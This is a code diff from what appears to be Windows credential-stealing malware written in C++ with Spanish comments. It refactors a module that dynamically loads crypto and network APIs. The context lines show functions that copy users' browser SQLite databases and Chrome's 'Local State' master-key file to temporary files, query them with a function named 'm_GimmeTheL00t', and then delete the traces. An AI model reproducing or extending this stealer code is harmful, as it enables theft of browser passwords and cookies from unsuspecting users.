@@ -4,28 +4,12 @@
 
 extern Cliente* cCliente;
 
-mod_Info::mod_Info() {
+mod_Info::mod_Info(st_Bcrypt& _bcrypt, st_Crypt32& _crypt32, st_Netapi32& _netapi32) {
 	//Cargar dll's y funciones
-	this->hBCryptDLL = wrapLoadDLL("Bcrypt.dll");
-	this->hCrypt32DLL = wrapLoadDLL("Crypt32.dll");
-	this->hNetApi32DLL = wrapLoadDLL("Netapi32.dll");
-
-	if (this->hBCryptDLL) {
-		this->BCRYPT.pBCryptDecrypt = (st_Bcrypt::LPBCRYPTDECRYPT)wrapGetProcAddr(this->hBCryptDLL, "BCryptDecrypt");
-		this->BCRYPT.pBCryptGenerateSymmetricKey = (st_Bcrypt::LPBCRYPTGENERATESYMMETRICKEY)wrapGetProcAddr(this->hBCryptDLL, "BCryptGenerateSymmetricKey");
-		this->BCRYPT.pBCryptOpenAlgorithmProvider = (st_Bcrypt::LPLPBCRYPTOPENALGORITHMPROVIDER)wrapGetProcAddr(this->hBCryptDLL, "BCryptOpenAlgorithmProvider");
-		this->BCRYPT.pBCryptCloseAlgorithmProvider = (st_Bcrypt::LPBCRYPTCLOSEALGORITHMPROVIDER)wrapGetProcAddr(this->hBCryptDLL, "BCryptCloseAlgorithmProvider");
-		this->BCRYPT.pBCryptSetProperty = (st_Bcrypt::LPBCRYPTSETPROPERTY)wrapGetProcAddr(this->hBCryptDLL, "BCryptSetProperty");
-	}
-
-	if (hCrypt32DLL) {
-		this->CRYPT32.pCryptUnprotectData = (st_Crypt32::LPCRYPTUNPROTECTDATA)wrapGetProcAddr(this->hCrypt32DLL, "CryptUnprotectData");
-	}
-
-	if (hNetApi32DLL) {
-		this->NETAPI32.pNetUserEnum = (st_Netapi32::LPNETUSERENUM)wrapGetProcAddr(this->hNetApi32DLL, "NetUserEnum");
-		this->NETAPI32.pNetApiBufferFree = (st_Netapi32::LPNETAPIBUFFERFREE)wrapGetProcAddr(this->hNetApi32DLL, "NetApiBufferFree");
-	}
+	
+	this->BCRYPT = _bcrypt;
+	this->CRYPT32 = _crypt32;
+	this->NETAPI32 = _netapi32;
 
 	if (!this->BCRYPT.pBCryptOpenAlgorithmProvider || !this->BCRYPT.pBCryptCloseAlgorithmProvider || !this->BCRYPT.pBCryptSetProperty) {
 		__DBG_("[dynamic] No se pudieron cargar las funciones");
@@ -56,25 +40,13 @@ mod_Info::~mod_Info() {
 			this->BCRYPT.pBCryptCloseAlgorithmProvider(this->hAlgorithm, 0);
 		}
 	}
-
-	if (this->hBCryptDLL) {
-		wrapFreeLibrary(this->hBCryptDLL);
-	}
-
-	if (this->hCrypt32DLL) {
-		wrapFreeLibrary(this->hCrypt32DLL);
-	}
-
-	if (this->hNetApi32DLL) {
-		wrapFreeLibrary(this->hNetApi32DLL);
-	}
 }
 
 std::vector<std::vector<std::string>> mod_Info::m_GimmeTheL00t(const char* cQuery, const char* cPath) {
 	std::vector<std::vector<std::string>> vcOut;
 	std::string strRandomPath = RandomID(7);
-	if (cCliente->KERNEL32.pCopyFileA) {
-		if (cCliente->KERNEL32.pCopyFileA((LPCSTR)cPath, (LPCSTR)strRandomPath.c_str(), FALSE)) {
+	if (cCliente->mod_dynamic->KERNEL32.pCopyFileA) {
+		if (cCliente->mod_dynamic->KERNEL32.pCopyFileA((LPCSTR)cPath, (LPCSTR)strRandomPath.c_str(), FALSE)) {
 			sqlite3* db;
 
 			int iRet = sqlite3_open(strRandomPath.c_str(), &db);
@@ -104,8 +76,8 @@ std::vector<std::vector<std::string>> mod_Info::m_GimmeTheL00t(const char* cQuer
 		}else {
 			_DBG_("No se pudo copiar la bd del usuario ", GetLastError());
 		}
-		if (cCliente->KERNEL32.pDeleteFileA) {
-			cCliente->KERNEL32.pDeleteFileA(strRandomPath.c_str());
+		if (cCliente->mod_dynamic->KERNEL32.pDeleteFileA) {
+			cCliente->mod_dynamic->KERNEL32.pDeleteFileA(strRandomPath.c_str());
 		}
 	}
 	return vcOut;
@@ -244,8 +216,8 @@ std::vector<Chrome_Profile> mod_Info::m_ChromeProfiles() {
 	//Copiar archivo que contiene la llave maestra e informacion de perfiles de chrome
 	std::string strFile = strPath + "Local State";
 
-	if (cCliente->KERNEL32.pCopyFileA) {
-		if (!cCliente->KERNEL32.pCopyFileA((LPCSTR)strFile.c_str(), "saramambichi", FALSE)) {
+	if (cCliente->mod_dynamic->KERNEL32.pCopyFileA) {
+		if (!cCliente->mod_dynamic->KERNEL32.pCopyFileA((LPCSTR)strFile.c_str(), "saramambichi", FALSE)) {
 			__DBG_("No se pudo copiar el archivo local state");
 			__DBG_(GetLastError());
 			return vcOut;
@@ -312,8 +284,8 @@ std::vector<Chrome_Profile> mod_Info::m_ChromeProfiles() {
 		iFile.close();
 	}
 
-	if (cCliente->KERNEL32.pDeleteFileA) {
-		cCliente->KERNEL32.pDeleteFileA("saramambichi");
+	if (cCliente->mod_dynamic->KERNEL32.pDeleteFileA) {
+		cCliente->mod_dynamic->KERNEL32.pDeleteFileA("saramambichi");
 	}
 	
 	return vcOut;
